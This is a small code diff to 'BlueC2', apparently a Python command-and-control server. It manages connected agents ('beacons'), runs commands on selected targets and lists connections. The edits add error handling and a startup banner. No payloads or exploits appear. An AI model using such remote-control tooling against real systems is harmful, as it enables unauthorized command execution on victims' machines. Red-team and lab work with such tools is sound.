@@ -32,6 +32,7 @@ class BlueServer:
             if splits[1].upper() == "HELP":
                 self.set_help()
             elif splits[1].upper() == "TARGETS":
+                self.targets = []
                 targets = splits[2].split(",")
                 for target in targets:
                     match = re.match(IP_REGEX,target)
@@ -55,12 +56,14 @@ class BlueServer:
                     reply = target.sock.recv(65535).decode()
                     print(str(target),reply,sep="\n")
                 except UnicodeDecodeError:
-                    print(str(target)+"\nUnicode Decode Error")
+                    print(str(target)+"\nERROR: Unicode Decode Error")
                 except ConnectionResetError:
                     print(str(target)+f"\nERROR: Connection reset\nBeacon got popped :(\nRemoving Agent #{target.number} from connection list\n")
                     self.connections.remove(target)
                     self.targets.remove(target)
-        elif userin.upper() == "SHOW CONNECTIONS" or userin.upper() == "SHOW CONNS":
+                except BrokenPipeError:
+                    print(str(target)+f"\nERROR: Broken pipe error\n")
+        elif userin.upper() in ["SHOW CONNECTIONS","SHOW CONNS"]:
             for conn in self.connections:
                 if conn != self.connections[-1]:
                     print(str(conn),end=",")
@@ -96,7 +99,7 @@ class BlueServer:
         print("SET <PARAMS>\tSets options for running program. Use SET HELP for more info")
         print("CMD <COMMAND>\tRuns a certain command on all selected targets")
         print("SHOW CONNECTIONS\tShows all connected agents")
-        print("SHELL <Agent # or IP>\tOpens an interactive shell on agent with specified IP")
+        #print("SHELL <Agent # or IP>\tOpens an interactive shell on agent with specified IP")
 
     def set_help(self):
         #Smaller help menu specific to the SET command
@@ -123,10 +126,19 @@ class BlueServer:
                 return agent
         return None #null return if no agents match
 
+def display_banner():
+    try:
+        with open("./banner.txt") as banner:
+            print(''.join([line for line in banner]))
+    except:
+        print("Starting BlueC2...\n")
+    print("\n")
 
 def main():
     server = BlueServer(10267)
+    display_banner()
     server.start()
     
 if __name__ == "__main__":
+
     main()
